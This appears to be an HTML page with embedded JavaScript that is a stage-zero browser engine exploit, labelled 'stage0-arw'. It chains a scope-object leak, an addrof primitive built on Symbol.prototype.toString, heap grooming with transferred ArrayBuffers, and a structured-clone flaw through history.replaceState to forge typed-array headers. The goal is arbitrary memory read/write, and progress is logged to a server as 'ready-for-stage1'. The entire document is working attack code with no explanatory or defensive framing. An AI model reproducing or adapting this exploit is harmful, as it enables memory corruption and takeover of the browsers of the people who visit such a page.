<!doctype html>
<meta charset="utf-8"><title>stage0-arw-13.42</title>
<body style="font:13px monospace;background:#0a0a0a;color:#0f0">
<pre id="out"></pre>
<script>
"use strict";

// ─── Configuration (identical to original working PoC) ───
var Q = new URLSearchParams(location.search);
var DRAIN_COUNT = parseInt(Q.get("n") || "512", 10);
if (!isFinite(DRAIN_COUNT)) DRAIN_COUNT = 512;
DRAIN_COUNT = Math.max(64, Math.min(1024, DRAIN_COUNT));

var K = 2, DUPLICATE_INDEX = 2, CONTROL_INDEX = 0xffff;
var CONTROL_INT = -64000, FILLER_BIGINTS = K - 1;
var FILLER_OBJECTS = 0xfffe - K, EXPECTED_LENGTH = 0x50001, CELL_BYTES = 0x30;
var CARRIER_SLOTS = 9000000, CAPTURE_DELAY_MS = 3000, COMPOSE_DELAY_MS = 6500;
var DRAIN_SIZE = 0x10000, SLAB_SIZE = 0x400000;
var BUTTERFLY_HOLE_SIZE = 0x81000, SEPARATOR_SIZE = 0x10000;
var EARLY_HOLE_SIZE = 0x70000, GUARD_SIZE = 0x90000;
var PREDECESSOR_SIZE = 0x80000, FINAL_HOLE_SIZE = 0x80000;

var seq = 0;
function mark(tag, extra) {
    seq++;
    var line = seq + "-st0-" + tag + (extra !== undefined ? "-" + extra : "");
    try {
        var xhr = new XMLHttpRequest();
        xhr.open("GET", "/log/" + encodeURIComponent(line), false);
        xhr.send();
    } catch (_) {}
    try { document.getElementById("out").textContent += line + "\n"; } catch (_) {}
    console.log(line);
}
function hex(v) { return "0x" + v.toString(16); }
function buf(s) { return new ArrayBuffer(s); }

// ─── ARW Globals ───
var gCandidate = null;
var gRWView = null;
var gRWOriginalVector = 0;

// ─── Original Bootstrap (unchanged) ───
var rwBuffer, rwView, rwMirror, targetBuffer, targetView, fakeHost, lengthWord;
var fillerGraph, outerGraph, referenceTarget;
var leakedScope, getterCarrier, preparedSymbolObject;
var capturedString, capturedWords, copiedLength = 0;
var captureState = 0, captureError = null;
var hostAddress = NaN, fakeAddress = NaN;
var keepAlive = new Array(DRAIN_COUNT + 3), keepIndex = 0;
var predecessorWords = null;
var targetAddress = NaN, targetAddressLow = 0, targetAddressHigh = 0;
var rwHeader = new Uint8Array(CELL_BYTES);
var targetHeader = new Uint8Array(CELL_BYTES);
var scratchBits = new ArrayBuffer(8);
var scratchBytes = new Uint8Array(scratchBits);
var scratchWords = new Uint32Array(scratchBits);
var scratchDouble = new Float64Array(scratchBits);
var rwOriginalVector = NaN, targetVector = NaN;
var rwHeaderOK = false, targetHeaderOK = false;
var readObserved = false, writeObserved = false, restoreObserved = false;
var compositionState = 0;

function leakScopeObject() {
    class Leaker { leak() { return super.foo; } }
    Leaker.prototype.__proto__ = new Proxy({}, {
        get: function (t, p, r) { return r; }
    });
    var leak = Leaker.prototype.leak;
    return (function () { return leak(); })();
}

function prepareSymbolWrapper(F) {
    leakedScope = leakScopeObject();
    if (!leakedScope) throw new Error("scope-not-leaked");
    for (var i = 0; i < 512; i++) leakedScope["p" + i] = i;
    for (var j = 0; j < 8; j++) leakedScope[j] = 1.1 * j;
    Object.defineProperty(leakedScope, "g", { get: F, configurable: true });
    return Object(leakedScope.g);
}

function pointerFromWords(words, offset) {
    if (words[offset + 3] !== 0) return NaN;
    return words[offset] + words[offset + 1] * 0x10000 + words[offset + 2] * 0x100000000;
}

function plausibleCell(value) {
    return value > 0x100000000 && value <= 0xffffffffffff && value <= 9007199254740991
        && Math.floor(value) === value && value % 8 === 0;
}

function encodedHeaderNumber() {
    var raw = new ArrayBuffer(8);
    var u32 = new Uint32Array(raw);
    var f64 = new Float64Array(raw);
    u32[0] = 0x00004250;
    u32[1] = 0x01062800;
    return f64[0];
}

function buildFakeHost() {
    rwBuffer = new ArrayBuffer(0x100);
    rwView = new Uint8Array(rwBuffer);
    rwMirror = new Uint8Array(rwBuffer);
    rwMirror[0] = 0x3c;
    targetBuffer = new ArrayBuffer(0x20);
    targetView = new Uint8Array(targetBuffer);
    targetView[0] = 0xa5;
    lengthWord = { keep: 0x51515151 };
    fakeHost = {
        q0: encodedHeaderNumber(), q1: 1.1, q2: rwView,
        q3: lengthWord, q4: 2.2, q5: 3.3
    };
    delete fakeHost.q1; delete fakeHost.q4; delete fakeHost.q5;
    if (!isFinite(fakeHost.q0) || fakeHost.q2 !== rwView || fakeHost.q3 !== lengthWord
        || rwView[0] !== 0x3c || targetView[0] !== 0xa5)
        throw new Error("fake-host-shape-failed");
}

function buildAndStoreGraph() {
    referenceTarget = { marker: 0x51515151, kind: "serialized-reference" };
    buildFakeHost();
    mark("SSV-BUILD", "k=" + K + "-n=" + DRAIN_COUNT);
    fillerGraph = new Array(0xfffd);
    var pos = 0;
    var huge = 1n << 40n;
    for (var b = 0; b < FILLER_BIGINTS; ++b) fillerGraph[pos++] = huge + BigInt(b);
    for (var o = 0; o < FILLER_OBJECTS; ++o) fillerGraph[pos++] = {};
    outerGraph = new Array(CONTROL_INDEX + 1);
    outerGraph[0] = fillerGraph;
    outerGraph[1] = referenceTarget;
    outerGraph[2] = referenceTarget;
    outerGraph[CONTROL_INDEX] = CONTROL_INT;
    mark("SSV-BUILT");
    history.replaceState(outerGraph, "");
    mark("SSV-STORED");
}

function prepareAddrof() {
    capturedWords = new Uint16Array(16);
    getterCarrier = function() { return 7; };
    mark("ADDROF-PREP", "slots=" + CARRIER_SLOTS);
    getterCarrier[0] = fakeHost;
    for (var i = 1; i < CARRIER_SLOTS; i++) getterCarrier[i] = 0;
    getterCarrier[1] = targetView;
    getterCarrier[2] = fakeHost;
    getterCarrier[3] = targetView;
    preparedSymbolObject = prepareSymbolWrapper(getterCarrier);
    mark("ADDROF-READY");
    setTimeout(runAddrofCapture, CAPTURE_DELAY_MS);
    setTimeout(beginComposition, COMPOSE_DELAY_MS);
}

function runAddrofCapture() {
    try {
        capturedString = Symbol.prototype.toString.call(preparedSymbolObject);
        copiedLength = capturedString.length;
        for (var i = 0; i < 16; i++) capturedWords[i] = capturedString.charCodeAt(7 + i);
        captureState = 1;
    } catch (e) { captureError = e; captureState = -1; }
}

function fillRawCellPointers(backing, pointer) {
    var ph = Math.floor(pointer / 0x100000000);
    var pl = pointer - ph * 0x100000000;
    if (!plausibleCell(pointer) || ph < 0 || ph > 0xffff
        || pl < 0 || pl > 0xffffffff || pl + ph * 0x100000000 !== pointer)
        throw new Error("invalid-address");
    predecessorWords = new Uint32Array(backing);
    for (var i = 0; i < predecessorWords.length; i += 2) {
        predecessorWords[i] = pl;
        predecessorWords[i + 1] = ph;
    }
}

function clearPredecessor() {
    if (predecessorWords) predecessorWords.fill(0);
}

function loadHistoryCritical() {
    var result = null, candidate = null;
    var rwHeaderCaptured = false, rwVectorTouched = false;
    try {
        result = history.state;
        if (result.length !== EXPECTED_LENGTH) {
            result[DUPLICATE_INDEX] = undefined;
            compositionState = 3; return;
        }
        if (result[1] === result[DUPLICATE_INDEX]) {
            result[DUPLICATE_INDEX] = undefined;
            compositionState = 2; return;
        }
        candidate = result[DUPLICATE_INDEX];
        result[DUPLICATE_INDEX] = undefined;
        result = null;

        for (var i = 0; i < CELL_BYTES; ++i) rwHeader[i] = candidate[i];
        rwHeaderCaptured = true;

        var rwSID = rwHeader[0] + rwHeader[1] * 0x100 + rwHeader[2] * 0x10000 + rwHeader[3] * 0x1000000;
        var rwHeaderHigh = rwHeader[4] + rwHeader[5] * 0x100 + rwHeader[6] * 0x10000 + rwHeader[7] * 0x1000000;
        var rwButterfly = rwHeader[8] + rwHeader[9] * 0x100 + rwHeader[10] * 0x10000 + rwHeader[11] * 0x1000000
            + rwHeader[12] * 0x100000000 + rwHeader[13] * 0x10000000000;
        var rwVectorLow = rwHeader[0x10] + rwHeader[0x11] * 0x100 + rwHeader[0x12] * 0x10000 + rwHeader[0x13] * 0x1000000;
        var rwVectorHigh = rwHeader[0x14] + rwHeader[0x15] * 0x100;
        rwOriginalVector = rwVectorLow + rwVectorHigh * 0x100000000;

        var rwOffsetZero = true;
        for (var rz = 0x20; rz < 0x28; ++rz) if (rwHeader[rz] !== 0) rwOffsetZero = false;

        rwHeaderOK = rwSID >= 0x4000 && rwSID < 0x08000000 && (rwSID & 0xf) === 0
            && rwHeader[4] === 0 && rwHeader[5] === 0x28 && rwHeader[6] === 0x08
            && (rwHeader[7] === 0 || rwHeader[7] === 1)
            && rwHeader[0x0e] === 0 && rwHeader[0x0f] === 0
            && rwButterfly > 0x100000000 && rwButterfly % 8 === 0
            && rwHeader[0x16] === 0 && rwHeader[0x17] === 0
            && rwOriginalVector > 0x100000000 && rwOriginalVector % 8 === 0
            && rwHeader[0x18] === 0 && rwHeader[0x19] === 1
            && rwHeader[0x1a] === 0 && rwHeader[0x1b] === 0
            && rwHeader[0x1c] === 0 && rwHeader[0x1d] === 0
            && rwHeader[0x1e] === 0 && rwHeader[0x1f] === 0
            && rwOffsetZero && rwHeader[0x28] === 0x58;

        if (!rwHeaderOK) { candidate = null; compositionState = 3; return; }

        scratchWords[0] = rwSID;
        scratchWords[1] = (rwHeaderHigh - 0x00020000) >>> 0;
        var upgradedHeader = scratchDouble[0];
        if (!(upgradedHeader === upgradedHeader && upgradedHeader !== Infinity && upgradedHeader !== -Infinity)) {
            candidate = null; compositionState = 3; return;
        }
        fakeHost.q0 = upgradedHeader;
        if (fakeHost.q0 !== upgradedHeader) { candidate = null; compositionState = 3; return; }

        scratchWords[0] = targetAddressLow;
        scratchWords[1] = targetAddressHigh;
        rwVectorTouched = true;
        for (var w1 = 0; w1 < 8; ++w1) candidate[0x10 + w1] = scratchBytes[w1];

        for (var j = 0; j < CELL_BYTES; ++j) targetHeader[j] = rwView[j];

        var targetSID = targetHeader[0] + targetHeader[1] * 0x100 + targetHeader[2] * 0x10000 + targetHeader[3] * 0x1000000;
        var targetButterfly = targetHeader[8] + targetHeader[9] * 0x100 + targetHeader[10] * 0x10000 + targetHeader[11] * 0x1000000
            + targetHeader[12] * 0x100000000 + targetHeader[13] * 0x10000000000;
        var targetVectorLow = targetHeader[0x10] + targetHeader[0x11] * 0x100 + targetHeader[0x12] * 0x10000 + targetHeader[0x13] * 0x1000000;
        var targetVectorHigh = targetHeader[0x14] + targetHeader[0x15] * 0x100;
        targetVector = targetVectorLow + targetVectorHigh * 0x100000000;

        var targetOffsetZero = true;
        for (var tz = 0x20; tz < 0x28; ++tz) if (targetHeader[tz] !== 0) targetOffsetZero = false;

        targetHeaderOK = targetSID === rwSID
            && targetHeader[4] === 0 && targetHeader[5] === 0x28 && targetHeader[6] === 0x08
            && (targetHeader[7] === 0 || targetHeader[7] === 1)
            && targetHeader[0x0e] === 0 && targetHeader[0x0f] === 0
            && targetButterfly > 0x100000000 && targetButterfly % 8 === 0
            && targetHeader[0x16] === 0 && targetHeader[0x17] === 0
            && targetVector > 0x100000000 && targetVector % 8 === 0
            && targetHeader[0x18] === 0x20
            && targetHeader[0x19] === 0 && targetHeader[0x1a] === 0
            && targetHeader[0x1b] === 0 && targetHeader[0x1c] === 0
            && targetHeader[0x1d] === 0 && targetHeader[0x1e] === 0
            && targetHeader[0x1f] === 0 && targetOffsetZero
            && targetHeader[0x28] === 0x58;

        if (!targetHeaderOK) {
            for (var r1 = 0; r1 < 8; ++r1) candidate[0x10 + r1] = rwHeader[0x10 + r1];
            candidate = null; compositionState = 3; return;
        }

        scratchWords[0] = targetVectorLow;
        scratchWords[1] = targetVectorHigh;
        for (var w2 = 0; w2 < 8; ++w2) candidate[0x10 + w2] = scratchBytes[w2];

        readObserved = rwView[0] === 0xa5 && targetView[0] === 0xa5;
        if (!readObserved) {
            for (var rRead = 0; rRead < 8; ++rRead) candidate[0x10 + rRead] = rwHeader[0x10 + rRead];
            targetView[0] = 0xa5; rwMirror[0] = 0x3c;
            candidate = null; compositionState = 3; return;
        }
        rwView[0] = 0x5a;
        writeObserved = rwView[0] === 0x5a && targetView[0] === 0x5a;
        rwView[0] = 0xa5;

        // ─── KEY: Keep candidate alive for ARW ───
        for (var r2 = 0; r2 < 8; ++r2) candidate[0x10 + r2] = rwHeader[0x10 + r2];
        targetView[0] = 0xa5; rwMirror[0] = 0x3c;
        restoreObserved = rwView[0] === 0x3c && rwMirror[0] === 0x3c && targetView[0] === 0xa5;

        gCandidate = candidate;
        gRWView = rwView;
        gRWOriginalVector = rwOriginalVector;

        candidate = null;
        clearPredecessor();
        compositionState = 1;
    } catch (error) {
        if (candidate !== null && rwHeaderCaptured && rwVectorTouched) {
            try { for (var rr = 0; rr < 8; ++rr) candidate[0x10 + rr] = rwHeader[0x10 + rr]; } catch (_) {}
        }
        candidate = null;
        try { targetView[0] = 0xa5; } catch (_) {}
        try { rwMirror[0] = 0x3c; } catch (_) {}
        try { clearPredecessor(); } catch (_) {}
        compositionState = -1;
    }
}

function runGroomAndLoad() {
    try {
        mark("GROOM-ENTER", "n=" + DRAIN_COUNT);
        var channel = new MessageChannel();
        channel.port1.close(); channel.port2.close();
        for (var i = 0; i < DRAIN_COUNT; ++i) keepAlive[keepIndex++] = buf(DRAIN_SIZE);
        var slab = buf(SLAB_SIZE);
        channel.port1.postMessage(0, [slab]);
        slab = null;
        var butterflyHole1 = buf(BUTTERFLY_HOLE_SIZE);
        var butterflyHole2 = buf(BUTTERFLY_HOLE_SIZE);
        var separator = buf(SEPARATOR_SIZE);
        var earlyHole = buf(EARLY_HOLE_SIZE);
        var guard = buf(GUARD_SIZE);
        var predecessor = buf(PREDECESSOR_SIZE);
        var finalHole = buf(FINAL_HOLE_SIZE);
        fillRawCellPointers(predecessor, fakeAddress);
        keepAlive[keepIndex++] = separator;
        keepAlive[keepIndex++] = guard;
        keepAlive[keepIndex++] = predecessor;
        mark("PREDECESSOR-FILLED", "fake=" + hex(fakeAddress));
        channel.port1.postMessage(0, [butterflyHole1, butterflyHole2, earlyHole, finalHole]);
        loadHistoryCritical();
    } catch (error) {
        try { clearPredecessor(); } catch (_) {}
        compositionState = -1;
    }

    // ─── Report ───
    if (compositionState === 1 && rwHeaderOK && targetHeaderOK && readObserved && writeObserved && restoreObserved) {
        mark("ARW-PASS", "sid=" + hex(rwHeader[0] + rwHeader[1]*0x100 + rwHeader[2]*0x10000 + rwHeader[3]*0x1000000));
        mark("ARW-VECTOR", "orig=" + hex(rwOriginalVector) + "-target=" + hex(targetVector));
        mark("ARW-CANDIDATE-ROOTED", "ready-for-stage1");
    } else if (compositionState === 2) {
        mark("NORMAL-MISS");
    } else if (compositionState === 3) {
        mark("HEADER-MISMATCH");
    } else {
        mark("FAIL", "state=" + compositionState);
    }
}

function beginComposition() {
    if (captureState === 0) { mark("ADDROF-NO-RESULT"); return; }
    if (captureState < 0) { mark("ADDROF-THREW", captureError.message); return; }

    var a0 = pointerFromWords(capturedWords, 0);
    var b0 = pointerFromWords(capturedWords, 4);
    var a1 = pointerFromWords(capturedWords, 8);
    var b1 = pointerFromWords(capturedWords, 12);

    mark("ADDROF-POINTERS", "HOST=" + hex(a0) + "-TARGET=" + hex(b0));

    if (!(a0 === a1 && b0 === b1 && a0 !== b0 && plausibleCell(a0) && plausibleCell(b0))) {
        mark("ADDROF-FAIL"); return;
    }

    hostAddress = a0;
    targetAddress = b0;
    targetAddressHigh = Math.floor(targetAddress / 0x100000000);
    targetAddressLow = targetAddress - targetAddressHigh * 0x100000000;
    fakeAddress = hostAddress + 0x10;

    if (!plausibleCell(fakeAddress)) { mark("FAKE-ADDRESS-FAIL"); return; }
    mark("FAKE-ADDRESS", hex(fakeAddress));
    runGroomAndLoad();
}

// ─── Boot ───
mark("BOOT", "stage0-arw-only-n=" + DRAIN_COUNT);

if (typeof BigInt !== "function" || typeof MessageChannel !== "function"
    || typeof Symbol !== "function" || typeof history === "undefined"
    || typeof history.replaceState !== "function") {
    mark("UNSUPPORTED");
} else {
    try {
        buildAndStoreGraph();
        prepareAddrof();
    } catch (error) {
        mark("SETUP-THREW", error.message);
    }
}
</script>
